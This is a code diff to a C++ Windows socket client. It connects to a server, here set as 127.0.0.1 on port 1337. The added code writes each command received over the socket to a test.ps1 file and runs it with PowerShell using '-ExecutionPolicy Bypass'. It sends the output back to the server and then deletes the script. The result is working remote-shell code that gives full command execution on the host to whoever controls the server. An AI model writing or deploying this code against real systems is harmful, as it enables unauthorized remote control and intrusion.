@@ -5,11 +5,34 @@
 #include <WS2tcpip.h>
 #include <cstdlib>
 #include<Windows.h>
+#include <cstdio>
+#include <iostream>
+#include <memory>
+#include <stdexcept>
+#include <string>
+#include <array>
+#include <fstream>
 #pragma comment(lib, "ws2_32.lib")
+
 
 using namespace std;
 
-int main()
+
+std::string exec(const char* cmd) {
+	std::array<char, 128> buffer;
+	std::string result;
+	std::unique_ptr<FILE, decltype(&_pclose)> pipe(_popen(cmd, "r"), _pclose);
+	if (!pipe) {
+		throw std::runtime_error("popen() failed!");
+	}
+	while (fgets(buffer.data(), buffer.size(), pipe.get()) != nullptr) {
+		result += buffer.data();
+	}
+	return result;
+}
+
+
+void main()
 {
 	string ipAddress = "127.0.0.1";			// IP Address of the server
 	int port = 1337;						// Listening port # on the server
@@ -55,6 +78,7 @@ int main()
 	char e_power[] = "exit_power";
 	char e_of_server[] = "exit_of_server";
 	string userInput;
+	string result = "";
 
 	ZeroMemory(buf, 4096);
 	int bytesReceived = recv(sock, buf, 4096, 0);
@@ -70,7 +94,23 @@ int main()
 				{
 					ZeroMemory(buf, 4096);
 					int bytesReceived = recv(sock, buf, 4096, 0);
-					system(buf);
+					ofstream file;
+					file.open("test.ps1");
+
+					string newArg = "-auto";
+					string powershell;
+					powershell = buf;
+
+					file << powershell << endl;
+					file.close();
+
+					result = exec("powershell -ExecutionPolicy Bypass -F test.ps1");
+					cout << result;
+
+					remove("test.ps1");
+					int sendResult = send(sock, result.c_str(), result.size(), 0);
+					result = "";
+					
 
 
 				}
